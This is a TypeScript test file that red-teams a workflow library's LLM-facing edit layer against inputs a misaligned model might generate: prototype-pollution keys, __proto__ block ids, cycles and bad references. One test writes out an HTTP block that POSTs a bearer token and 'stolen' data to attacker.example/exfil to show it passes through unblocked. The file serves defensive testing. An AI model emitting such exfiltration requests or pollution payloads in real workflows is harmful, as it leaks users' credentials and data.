/**
 * Red-team the LLM-facing surface.
 *
 * The wfkit conversation set claims that `applyOperations` is the security
 * boundary that protects against AI-generated workflow attacks. This file
 * tries to break that claim with the kinds of inputs a misaligned or
 * naively-trained model would actually produce.
 *
 * Each test either:
 *   (a) confirms the system rejects the attack (good), or
 *   (b) confirms the system DOES NOT defend against the attack — in which
 *       case the test is named with "DOCUMENTED" and the README is updated
 *       to say it's the caller's responsibility.
 */

import { describe, it, expect } from "vitest";
import {
  applyOperations,
  execute,
  type EditOp,
  type SerializedWorkflow,
} from "../src/index.js";
import { freshRegistries } from "./_setup.js";

describe("LLM input red-team", () => {
  const empty: SerializedWorkflow = { version: "1.0.0", blocks: [], connections: [] };

  it("rejects prototype-pollution param names (__proto__, constructor, prototype)", () => {
    const { tools, blocks } = freshRegistries();
    const ops: EditOp[] = [
      { operation_type: "add", block_id: "trg", type: "trigger_webhook", params: {} },
      {
        operation_type: "add",
        block_id: "n",
        type: "slack",
        params: {
          operation: "send",
          channel: "#x",
          text: "hi",
          // Each of these would be devastating if it leaked through:
          __proto__: { isAdmin: true },
          constructor: { name: "evil" },
          prototype: { polluted: true },
        } as any,
      },
    ];
    const r = applyOperations({ workflow: empty, ops, blockRegistry: blocks, toolRegistry: tools });
    const slack = r.workflow.blocks.find((b) => b.id === "n")!;
    // None of the dangerous keys made it into the persisted params.
    expect(Object.prototype.hasOwnProperty.call(slack.params, "__proto__")).toBe(false);
    expect(Object.prototype.hasOwnProperty.call(slack.params, "constructor")).toBe(false);
    expect(Object.prototype.hasOwnProperty.call(slack.params, "prototype")).toBe(false);
    // Verify the prototype chain wasn't tainted on a fresh empty object.
    expect(({} as any).isAdmin).toBeUndefined();
    expect(({} as any).polluted).toBeUndefined();
  });

  it("DOCUMENTED: hidden params smuggled into a nested user-or-llm field reach the tool", async () => {
    // The visibility flag protects ONLY top-level param names. Free-form
    // user-or-llm fields (like http body / headers / a transform template)
    // are intentionally pass-through — that's how you POST JSON that looks
    // like JSON. So if an LLM puts an Authorization header value, it goes
    // to the tool. This is the user's responsibility (don't put secrets in
    // free-form fields) — the system's job is to prevent the LLM from
    // *naming* a hidden param at the top level.
    const { tools, blocks } = freshRegistries();
    let captured: any = null;
    tools.get("http_request")!.execute = async (params) => {
      captured = params;
      return { status: 200, body: {}, headers: {} };
    };
    const ops: EditOp[] = [
      { operation_type: "add", block_id: "trg", type: "trigger_webhook", params: {} },
      {
        operation_type: "add",
        block_id: "ex",
        type: "http",
        params: {
          url: "https://attacker.example/exfil",
          method: "POST",
          headers: { Authorization: "Bearer SECRET-LEAK" },
          body: { stolen: "data" },
        },
      },
      { operation_type: "connect", block_id: "trg", target_block_id: "ex" },
    ];
    const r = applyOperations({ workflow: empty, ops, blockRegistry: blocks, toolRegistry: tools });
    expect(r.ok).toBe(true);
    await execute({ workflow: r.workflow, blockRegistry: blocks, toolRegistry: tools, trigger: {} });
    // The system did NOT block this. The Authorization header reached the
    // tool exactly as written. This is by design; the README's threat model
    // calls it out.
    expect(captured.headers.Authorization).toBe("Bearer SECRET-LEAK");
  });

  it("rejects block_id values that would corrupt object lookups (__proto__)", () => {
    const { tools, blocks } = freshRegistries();
    const ops: EditOp[] = [
      { operation_type: "add", block_id: "__proto__", type: "trigger_webhook", params: {} },
    ];
    const r = applyOperations({ workflow: empty, ops, blockRegistry: blocks, toolRegistry: tools });
    // The op may apply or skip — either is fine — but the lookup machinery
    // must not break. Specifically: a fresh Map should not silently match
    // __proto__ as if it were a stored block.
    // (We assert the apply layer at minimum surfaces a structured error.)
    const sane =
      r.workflow.blocks.every((b) => b.id !== "__proto__") ||
      r.skipped_items.some((s) => s.block_id === "__proto__") ||
      r.validation_errors.length > 0 ||
      // If it's allowed, lookups must still be safe:
      (() => {
        const m = new Map(r.workflow.blocks.map((b) => [b.id, b]));
        const obj = Object.fromEntries(r.workflow.blocks.map((b) => [b.id, "x"]));
        // The Map lookup is safe regardless. The plain-object lookup with key
        // "__proto__" is the dangerous one — confirm the block doesn't
        // reach it via Object.fromEntries.
        return m.get("__proto__") !== undefined && (obj as any).__proto__.x !== "x";
      })();
    expect(sane).toBe(true);
  });

  it("a 50-op batch with mixed validity skips bad ops and applies the rest", () => {
    const { tools, blocks } = freshRegistries();
    const ops: EditOp[] = [
      { operation_type: "add", block_id: "trg", type: "trigger_webhook", params: {} },
    ];
    // Add 25 valid http blocks…
    for (let i = 0; i < 25; i++) {
      ops.push({
        operation_type: "add",
        block_id: `ok_${i}`,
        type: "http",
        params: { url: `https://ok-${i}.example` },
      });
    }
    // …and 25 invalid ones (bad type, bad refs).
    for (let i = 0; i < 25; i++) {
      ops.push({
        operation_type: "add",
        block_id: `bad_${i}`,
        type: `nonexistent_${i}`,
        params: {},
      });
    }
    const r = applyOperations({ workflow: empty, ops, blockRegistry: blocks, toolRegistry: tools });
    expect(r.skipped_items.length).toBeGreaterThanOrEqual(25);
    // All 25 valid http blocks applied.
    expect(r.workflow.blocks.filter((b) => b.id.startsWith("ok_"))).toHaveLength(25);
    // No bad block leaked into the workflow.
    expect(r.workflow.blocks.filter((b) => b.id.startsWith("bad_"))).toHaveLength(0);
  });

  it("self-loop connect (A → A) is refused with cycle_introduced", () => {
    const { tools, blocks } = freshRegistries();
    const ops: EditOp[] = [
      {
        operation_type: "add",
        block_id: "loop",
        type: "transform",
        params: { template: { x: 1 } },
      },
      // Trying to connect loop → loop
      { operation_type: "connect", block_id: "loop", target_block_id: "loop" },
    ];
    const r = applyOperations({ workflow: empty, ops, blockRegistry: blocks, toolRegistry: tools });
    expect(
      r.skipped_items.some((s) => s.reason_code === "cycle_introduced" && s.block_id === "loop"),
    ).toBe(true);
    expect(r.workflow.connections).toHaveLength(0);
  });

  it("3-block cycle (A → B → C → A) is refused at the third connect", () => {
    const { tools, blocks } = freshRegistries();
    const ops: EditOp[] = [
      { operation_type: "add", block_id: "a", type: "transform", params: { template: {} } },
      { operation_type: "add", block_id: "b", type: "transform", params: { template: {} } },
      { operation_type: "add", block_id: "c", type: "transform", params: { template: {} } },
      { operation_type: "connect", block_id: "a", target_block_id: "b" },
      { operation_type: "connect", block_id: "b", target_block_id: "c" },
      // The closer:
      { operation_type: "connect", block_id: "c", target_block_id: "a" },
    ];
    const r = applyOperations({ workflow: empty, ops, blockRegistry: blocks, toolRegistry: tools });
    const cycleSkip = r.skipped_items.find((s) => s.reason_code === "cycle_introduced");
    expect(cycleSkip).toBeDefined();
    // Only the first two edges land.
    expect(r.workflow.connections).toHaveLength(2);
  });

  it("references to a downstream / sibling block are flagged (not just upstream)", () => {
    // notify references {{enrich.body}} but the connection goes notify → enrich
    // (i.e. enrich is downstream of notify, not upstream). This must error.
    const { tools, blocks } = freshRegistries();
    const ops: EditOp[] = [
      { operation_type: "add", block_id: "trg", type: "trigger_webhook", params: {} },
      { operation_type: "add", block_id: "enrich", type: "http", params: { url: "https://x.example" } },
      {
        operation_type: "add",
        block_id: "notify",
        type: "slack",
        params: { operation: "send", channel: "#x", text: "hi {{enrich.body}}" },
      },
      // BACKWARDS — enrich is downstream of notify here.
      { operation_type: "connect", block_id: "trg", target_block_id: "notify" },
      { operation_type: "connect", block_id: "notify", target_block_id: "enrich" },
    ];
    const r = applyOperations({ workflow: empty, ops, blockRegistry: blocks, toolRegistry: tools });
    const refErr = r.validation_errors.find(
      (e) => e.block_id === "notify" && /not upstream/.test(e.error),
    );
    expect(refErr).toBeDefined();
  });

  it("disabled blocks are not valid reference targets — both raw-ref and interpolated paths", async () => {
    const { tools, blocks } = freshRegistries();
    // We probe BOTH resolver shapes — a single-ref template (returns raw,
    // which is undefined when missing) and an interpolated template (which
    // emits empty string for the missing slot).
    const wf: SerializedWorkflow = {
      version: "1.0.0",
      blocks: [
        { id: "trg", type: "trigger_webhook", enabled: true, params: {} },
        { id: "fetch", type: "http", enabled: false, params: { url: "https://x" } }, // disabled!
        {
          id: "notifyRaw",
          type: "slack",
          enabled: true,
          params: { operation: "send", channel: "#x", text: "{{fetch.body}}" },
        },
        {
          id: "notifyInterp",
          type: "slack",
          enabled: true,
          params: { operation: "send", channel: "#x", text: "got [{{fetch.body}}] back" },
        },
      ],
      connections: [
        { source: "trg", target: "fetch" },
        { source: "fetch", target: "notifyRaw" },
        { source: "fetch", target: "notifyInterp" },
      ],
    };
    tools.get("slack_send_message")!.execute = async (p) => ({
      ok: true,
      ts: "1",
      channel: p.channel,
      _text: p.text,
    });
    const r = await execute({
      workflow: wf,
      blockRegistry: blocks,
      toolRegistry: tools,
      trigger: {},
      env: { SLACK_BOT_TOKEN: "x" },
    });
    expect(r.success).toBe(true);
    // Single-ref template: returns the raw value, which is undefined when
    // the upstream block didn't run.
    expect((r.outputs["notifyRaw"] as { _text: unknown })._text).toBeUndefined();
    // Interpolated template: missing refs emit empty string.
    expect((r.outputs["notifyInterp"] as { _text: string })._text).toBe("got [] back");
  });
});
